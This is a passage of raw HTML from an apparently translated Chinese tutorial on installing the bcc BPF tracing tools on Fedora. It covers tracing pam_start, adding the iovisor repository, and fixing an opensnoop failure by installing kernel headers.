</span><span class=\"crayon-i\">root</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000ba861594124-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>在这里，我正在跟踪 <code>libpam</code> 及其 <code>pam_start(3)</code> 函数，并将其两个参数都打印为字符串。 <code>libpam</code> 用于插入式身份验证模块系统，该输出显示 sshd 为 “root” 用户调用了 <code>pam_start()</code>（我登录了）。 其使用信息中有更多的例子（<code>trace -h</code>），而且所有这些工具在 bcc 版本库中都有手册页和示例文件。 例如 <code>trace_example.txt</code> 和 <code>trace.8</code>。</p>\n<h3 id=\"toc_9\">通过包安装 bcc</h3>\n<p>安装 bcc 最佳的方法是从 iovisor 仓储库中安装，按照 bcc 的 <a href=\"https://github.com/iovisor/bcc/blob/master/INSTALL.md#fedora---binary\">INSTALL.md</a> 进行即可。<a href=\"https://www.iovisor.org/\">IO Visor</a> 是包括了 bcc 的 Linux 基金会项目。4.x 系列 Linux 内核中增加了这些工具所使用的 BPF 增强功能，直到 4.9 添加了全部支持。这意味着拥有 4.8 内核的 Fedora 25 可以运行这些工具中的大部分。 使用 4.11 内核的 Fedora 26 可以全部运行它们（至少在目前是这样）。</p>\n<p>如果你使用的是 Fedora 25（或者 Fedora 26，而且这个帖子已经在很多个月前发布了 —— 你好，来自遥远的过去！），那么这个通过包安装的方式是可以工作的。 如果您使用的是 Fedora 26，那么请跳至“通过源代码安装”部分，它避免了一个<a href=\"https://reviews.llvm.org/rL302055\">已修复的</a>的<a href=\"https://github.com/iovisor/bcc/issues/1221\">已知</a>错误。 这个错误修复目前还没有进入 Fedora 26 软件包的依赖关系。 我使用的系统是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000be131737487\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# uname -a\r\nLinux localhost.localdomain 4.11.8-300.fc26.x86_64 #1 SMP Thu Jun 29 20:09:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\r\n# cat /etc/fedora-release\r\nFedora release 26 (Twenty Six)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000be131737487-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000be131737487-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000be131737487-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000be131737487-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000be131737487-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000be131737487-1\"><span class=\"crayon-p\"># uname -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000be131737487-2\"><span class=\"crayon-e\">Linux </span><span class=\"crayon-v\">localhost</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">localdomain</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4.11.8</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">300.fc26.x86_64</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#1 SMP Thu Jun 29 20:09:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000be131737487-3\"><span class=\"crayon-p\"># cat /etc/fedora-release</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000be131737487-4\"><span class=\"crayon-e\">Fedora </span><span class=\"crayon-i\">release</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">26</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Twenty </span><span class=\"crayon-v\">Six</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000be131737487-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>以下是我所遵循的安装步骤，但请参阅 INSTALL.md 获取更新的版本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000c2614976504\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# echo -e '[iovisor]\\nbaseurl=https://repo.iovisor.org/yum/nightly/f25/$basearch\\nenabled=1\\ngpgcheck=0' | sudo tee /etc/yum.repos.d/iovisor.repo\r\n# dnf install bcc-tools\r\n[...]\r\nTotal download size: 37 M\r\nInstalled size: 143 M\r\nIs this ok [y/N]: y\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c2614976504-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c2614976504-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c2614976504-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c2614976504-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c2614976504-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c2614976504-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c2614976504-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000c2614976504-1\"><span class=\"crayon-p\"># echo -e '[iovisor]\\nbaseurl=https://repo.iovisor.org/yum/nightly/f25/$basearch\\nenabled=1\\ngpgcheck=0' | sudo tee /etc/yum.repos.d/iovisor.repo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c2614976504-2\"><span class=\"crayon-p\"># dnf install bcc-tools</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c2614976504-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c2614976504-4\"><span class=\"crayon-e\">Total </span><span class=\"crayon-e\">download </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">37</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c2614976504-5\"><span class=\"crayon-e\">Installed </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">143</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c2614976504-6\"><span class=\"crayon-st\">Is</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ok</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">y</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c2614976504-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>安装完成后，您可以在 <code>/usr/share</code> 中看到新的工具：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000c5230504520\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ls /usr/share/bcc/tools/\r\nargdist       dcsnoop              killsnoop       softirqs    trace\r\nbashreadline  dcstat               llcstat         solisten    ttysnoop\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c5230504520-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c5230504520-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c5230504520-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c5230504520-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c5230504520-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000c5230504520-1\"><span class=\"crayon-p\"># ls /usr/share/bcc/tools/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c5230504520-2\"><span class=\"crayon-e\">argdist       </span><span class=\"crayon-e\">dcsnoop              </span><span class=\"crayon-e\">killsnoop       </span><span class=\"crayon-e\">softirqs    </span><span class=\"crayon-e\">trace</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c5230504520-3\"><span class=\"crayon-e\">bashreadline  </span><span class=\"crayon-e\">dcstat               </span><span class=\"crayon-e\">llcstat         </span><span class=\"crayon-e\">solisten    </span><span class=\"crayon-i\">ttysnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c5230504520-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c5230504520-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>试着运行其中一个：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000c8027157196\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nchdir(/lib/modules/4.11.8-300.fc26.x86_64/build): No such file or directory\r\nTraceback (most recent call last):\r\n  File \"/usr/share/bcc/tools/opensnoop\", line 126, in \r\n    b = BPF(text=bpf_text)\r\n  File \"/usr/lib/python3.6/site-packages/bcc/__init__.py\", line 284, in __init__\r\n    raise Exception(\"Failed to compile BPF module %s\" % src_file)\r\nException: Failed to compile BPF module\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c8027157196-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c8027157196-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c8027157196-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c8027157196-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c8027157196-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c8027157196-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c8027157196-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000c8027157196-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000c8027157196-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000c8027157196-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c8027157196-2\"><span class=\"crayon-e\">chdir</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">modules</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">4.11.8</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">300.fc26.x86_64</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">build</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">No </span><span class=\"crayon-e\">such </span><span class=\"crayon-e\">file </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">directory</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c8027157196-3\"><span class=\"crayon-e\">Traceback</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">most </span><span class=\"crayon-e\">recent </span><span class=\"crayon-e\">call </span><span class=\"crayon-v\">last</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c8027157196-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/usr/share/bcc/tools/opensnoop\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">126</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c8027157196-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">b</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">BPF</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">text</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">bpf_text</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c8027157196-6\"><span class=\"crayon-h\">  </span><span class=\"crayon-i\">File</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"/usr/lib/python3.6/site-packages/bcc/__init__.py\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">line</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">284</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">__init__</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c8027157196-7\"><span class=\"crayon-e\">    </span><span class=\"crayon-e\">raise </span><span class=\"crayon-e\">Exception</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Failed to compile BPF module %s\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">src_file</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000c8027157196-8\"><span class=\"crayon-v\">Exception</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Failed </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compile </span><span class=\"crayon-e\">BPF </span><span class=\"crayon-i\">module</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000c8027157196-9\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0020 seconds] -->\r\n<p>运行失败，提示 <code>/lib/modules/4.11.8-300.fc26.x86_64/build</code> 丢失。 如果你也遇到这个问题，那只是因为系统缺少内核头文件。 如果你看看这个文件指向什么（这是一个符号链接），然后使用 <code>dnf whatprovides</code> 来搜索它，它会告诉你接下来需要安装的包。 对于这个系统，它是：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000cc033700665\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# dnf install kernel-devel-4.11.8-300.fc26.x86_64\r\n[...]\r\nTotal download size: 20 M\r\nInstalled size: 63 M\r\nIs this ok [y/N]: y\r\n[...]\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000cc033700665-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000cc033700665-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000cc033700665-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000cc033700665-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000cc033700665-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f303f000cc033700665-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f303f000cc033700665-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f303f000cc033700665-1\"><span class=\"crayon-p\"># dnf install kernel-devel-4.11.8-300.fc26.x86_64</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000cc033700665-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000cc033700665-3\"><span class=\"crayon-e\">Total </span><span class=\"crayon-e\">download </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000cc033700665-4\"><span class=\"crayon-e\">Installed </span><span class=\"crayon-v\">size</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">63</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">M</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000cc033700665-5\"><span class=\"crayon-st\">Is</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ok</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">y</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">N</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">y</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f303f000cc033700665-6\"><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a6f303f000cc033700665-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>现在：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f303f000d0904046382\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 